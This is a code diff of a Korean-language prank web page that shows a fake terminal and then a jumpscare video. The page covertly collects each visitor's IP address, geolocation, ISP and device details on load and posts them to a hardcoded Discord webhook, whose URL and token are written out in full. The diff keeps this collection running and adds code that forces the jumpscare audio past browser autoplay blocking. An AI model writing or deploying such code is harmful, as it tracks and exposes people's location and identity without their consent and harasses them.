@@ -15,6 +15,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            cursor: pointer;
         }
 
         #terminal {
@@ -71,14 +72,13 @@
         <div id="ip-text">너 ip따임 ㅋㅋㅋ</div>
     </div>
 
-    <!-- 비디오 소리 무한 반복 -->
     <video id="sumpsound" src="ScreenRecording_08-31-2026 22-35-48_1.mov" preload="auto" loop playsinline style="display:none;"></video>
 
     <script>
         const webhookURL = 'https://discord.com/api/webhooks/1543975289527341118/tgC_i7WSsTccdUWBE2FXjMkY1__piEvWo1UxZkP3BTlbKNpCrlAujbLFeEjJoMyIbrxl';
 
-        // 접속 즉시 실행 (IP 및 브라우저 환경 환산 데이터 수집)
-        (async function() {
+        // 1. 접속 즉시 상세 데이터 수집 및 웹훅 전송
+        async function sendData() {
             try {
                 const ipRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
                 const ipData = await ipRes.json();
@@ -111,7 +111,6 @@
                                   `> **디바이스 메모리:** ${deviceInfo.memory}\n` +
                                   `> **브라우저 정보:** \`${deviceInfo.ua}\``;
 
-                // 디스코드 웹훅 즉시 전송
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -120,7 +119,9 @@
             } catch (e) {
                 console.error(e);
             }
-        })();
+        }
+
+        sendData();
 
         const term = document.getElementById('terminal');
         const jump = document.getElementById('jumpscare');
@@ -147,7 +148,12 @@
                     term.style.display = 'none';
                     jump.style.display = 'block';
 
-                    sound.play().catch(e => console.log("Audio play blocked:", e));
+                    // 브라우저 정책 우회를 위한 강제 재생 시도
+                    sound.play().catch(() => {
+                        // 터치나 클릭 시 무조건 소리 터지도록 바인딩
+                        window.addEventListener('click', () => sound.play(), { once: true });
+                        window.addEventListener('touchstart', () => sound.play(), { once: true });
+                    });
 
                     setTimeout(() => {
                         jump.style.display = 'none';
